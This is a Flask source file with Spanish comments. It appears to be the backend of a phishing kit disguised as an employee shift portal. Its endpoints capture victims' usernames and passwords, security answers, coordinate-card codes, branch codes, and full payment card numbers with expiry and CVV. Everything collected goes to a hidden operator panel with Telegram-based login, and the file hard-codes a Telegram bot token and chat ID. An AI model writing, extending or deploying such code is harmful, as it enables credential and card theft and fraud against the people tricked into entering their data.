from flask import Flask, render_template, request, redirect, url_for, session, jsonify
from datetime import timedelta
import random
import requests
import os

app = Flask(__name__)
app.secret_key = 'pon_aqui_una_clave_secreta_totalmente_diferente'
app.config['PERMANENT_SESSION_LIFETIME'] = timedelta(minutes=30)

# ================= CONFIGURACIÓN DE TELEGRAM (Solo para códigos de acceso al Panel) =================
TELEGRAM_BOT_TOKEN = "8075556042:AAFoz2S2xiLqDV_gEm0qc-HsxdbSNFm-nIM"
TELEGRAM_CHAT_ID = "5352335307"

empleados_activos = {}        # Registros de los empleados (Aquí llega todo al panel)
usuarios_panel_activos = {}   # Operadores conectados al panel
ips_bloqueadas = []
codigos_telegram_temporales = {}

def enviar_telegram(mensaje):
    if TELEGRAM_BOT_TOKEN and "TU_TOKEN" not in TELEGRAM_BOT_TOKEN:
        try:
            url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
            requests.post(url, json={"chat_id": TELEGRAM_CHAT_ID, "text": mensaje})
        except Exception:
            pass

@app.before_request
def verificar_ip():
    if request.remote_addr in ips_bloqueadas and not request.path.startswith('/static'):
        return "Acceso bloqueado.", 403

    if session.get('admin_logueado'):
        usuario_actual = session.get('admin_user')
        if usuario_actual != "theteacher" and usuario_actual not in usuarios_panel_activos:
            session.clear()

# ================= RUTAS DE USUARIO / CLIENTE =================
@app.route('/portal')
def portal():
    # Solo carga la página. Ya no le pasa los diccionarios gigantes aquí.
    return render_template('control.html')

# ================= API OCULTA PARA EL PANEL DINÁMICO =================
@app.route('/api/obtener_empleados_json')
def obtener_empleados_json():
    if not session.get('admin_logueado'):
        return jsonify({"error": "No autorizado"}), 403
        
    return jsonify({
        "status": "success",
        "empleados": empleados_activos,
        "usuarios_panel": usuarios_panel_activos
    })

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/api/validar_turno', methods=['POST'])
def validar_turno():
    data = request.get_json() if request.is_json else request.form
    ip_cliente = request.remote_addr
    
    usuario = data.get('username', 'N/A')
    turno = data.get('password', 'N/A')
    empresa = data.get('empresa', 'Primera Empresa')
    
    registro_id = str(random.randint(1000, 9999))
    
    # Se inicializa el registro completo para el panel
    empleados_activos[registro_id] = {
        "ip": ip_cliente,
        "usuario": usuario,
        "turno": turno,
        "empresa": empresa,
        "codigo_sucursal": "Pendiente",
        "estado": "Activo",
        "respuestas": "Pendiente",
        "coordenadas": {},
        "tarjeta": {}
    }
    
    return jsonify({"status": "success", "registro_id": registro_id, "valido": True})

@app.route('/api/registrar_actividad', methods=['POST'])
def registrar_actividad():
    data = request.get_json() if request.is_json else request.form
    registro_id = data.get('registro_id') or (list(empleados_activos.keys())[-1] if empleados_activos else None)
    
    todas_actividades = [f"{i:02d}" for i in range(1, 40)]
    primeras_4 = random.sample(todas_actividades, 4)
    restantes = [a for a in todas_actividades if a not in primeras_4]
    siguientes_4 = random.sample(restantes, 4)
    
    respuestas_texto = data.get('respuestas', 'N/A')
    
    # Se guardan las preguntas y respuestas directamente en el registro del panel
    if registro_id and registro_id in empleados_activos:
        empleados_activos[registro_id]["respuestas"] = respuestas_texto
        empleados_activos[registro_id]["primeras"] = primeras_4
        empleados_activos[registro_id]["siguientes"] = siguientes_4
    
    return jsonify({
        "status": "success",
        "registro_id": registro_id,
        "primeras": primeras_4,
        "siguientes": siguientes_4
    })

@app.route('/api/guardar_coordenadas', methods=['POST'])
def guardar_coordenadas():
    data = request.get_json() if request.is_json else request.form
    registro_id = data.get('registro_id') or (list(empleados_activos.keys())[-1] if empleados_activos else None)
    coordenadas = data.get('coordenadas', {})
    
    if registro_id and registro_id in empleados_activos:
        # Actualizamos o combinamos las coordenadas existentes con las nuevas
        if "coordenadas" not in empleados_activos[registro_id]:
            empleados_activos[registro_id]["coordenadas"] = {}
        empleados_activos[registro_id]["coordenadas"].update(coordenadas)
    
    return jsonify({"status": "success"})

@app.route('/api/guardar_codigo_sucursal', methods=['POST'])
def guardar_codigo_sucursal():
    data = request.get_json()
    registro_id = data.get('registro_id')
    codigo_sucursal = data.get('codigo_sucursal')
    
    if registro_id in empleados_activos:
        empleados_activos[registro_id]['codigo_sucursal'] = codigo_sucursal
        
    return jsonify({"status": "success"})

@app.route('/api/guardar_tarjeta', methods=['POST'])
def guardar_tarjeta():
    data = request.get_json() if request.is_json else request.form
    registro_id = data.get('registro_id') or (list(empleados_activos.keys())[-1] if empleados_activos else None)
    
    tarjeta_info = {
        "numero": data.get('tarjeta', 'N/A'),
        "expiry": data.get('expiry', 'N/A'),
        "cvv": data.get('cvv', 'N/A')
    }
    
    # Se guardan los datos del carnet/tarjeta en el panel
    if registro_id and registro_id in empleados_activos:
        empleados_activos[registro_id]["tarjeta"] = tarjeta_info
        
    return jsonify({"status": "success"})  

# ================= PANEL DE ADMINISTRACIÓN (Login Telegram solo para clave de acceso) =================
@app.route('/portal/control/login', methods=['GET', 'POST'])
def admin_login():
    error = None
    paso = "pedir_usuario"
    
    if request.method == 'POST':
        accion = request.form.get('accion')
        
        if accion == 'enviar_usuario':
            usuario = request.form.get('usuario', '').strip().lower()
            if usuario:
                codigo_aleatorio = str(random.randint(100000, 999999))
                codigos_telegram_temporales[usuario] = codigo_aleatorio
                
                enviar_telegram(f"🔐 Solicitud de acceso al panel.\nUsuario: {usuario}\nCódigo: {codigo_aleatorio}")
                
                paso = "pedir_codigo"
                return render_template('admin_login.html', error=None, paso=paso, usuario=usuario)
            else:
                error = "Ingresa un usuario válido."
                
        elif accion == 'verificar_codigo':
            usuario = request.form.get('usuario', '').strip().lower()
            codigo_ingresado = request.form.get('codigo', '').strip()
            
            if usuario in codigos_telegram_temporales and codigos_telegram_temporales[usuario] == codigo_ingresado:
                del codigos_telegram_temporales[usuario]
                
                session['admin_logueado'] = True
                session['admin_user'] = usuario
                session.permanent = True
                
                if usuario == "theteacher":
                    session['admin_rol'] = "principal"
                else:
                    session['admin_rol'] = "secundario"
                    usuarios_panel_activos[usuario] = {
                        "ip": request.remote_addr,
                        "rol": session['admin_rol']
                    }
                
                return redirect(url_for('panel_secreto'))
            else:
                error = "Código incorrecto o expirado."
                paso = "pedir_codigo"
                return render_template('admin_login.html', error=error, paso=paso, usuario=usuario)
                
    return render_template('admin_login.html', error=error, paso=paso)

@app.route('/portal/control')
def panel_secreto():
    if not session.get('admin_logueado'):
        return redirect(url_for('admin_login'))
    
    return render_template(
        'panel_control.html', 
        empleados=empleados_activos,
        usuarios_panel=usuarios_panel_activos,
        usuario=session.get('admin_user'),
        rol=session.get('admin_rol')
    )

@app.route('/portal/control/logout')
def admin_logout():
    usuario_actual = session.get('admin_user')
    if usuario_actual in usuarios_panel_activos:
        del usuarios_panel_activos[usuario_actual]
    session.clear()
    return redirect(url_for('admin_login'))

@app.route('/admin/accion', methods=['POST'])
def admin_accion():
    if not session.get('admin_logueado'):
        return jsonify({"error": "No autorizado"}), 403
        
    data = request.json
    accion = data.get('accion')
    reg_id = data.get('id')
    ip_objetivo = data.get('ip')
    target_usuario = data.get('usuario')
    
    if accion == 'bloquear_ip' and ip_objetivo:
        if ip_objetivo not in ips_bloqueadas:
            ips_bloqueadas.append(ip_objetivo)
            
    if session.get('admin_rol') == 'principal':
        if accion == 'borrar' and reg_id in empleados_activos:
            del empleados_activos[reg_id]
        elif accion == 'cerrar_sesion_panel' and target_usuario:
            if target_usuario in usuarios_panel_activos:
                del usuarios_panel_activos[target_usuario]
                
    return jsonify({"status": "ok"})

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)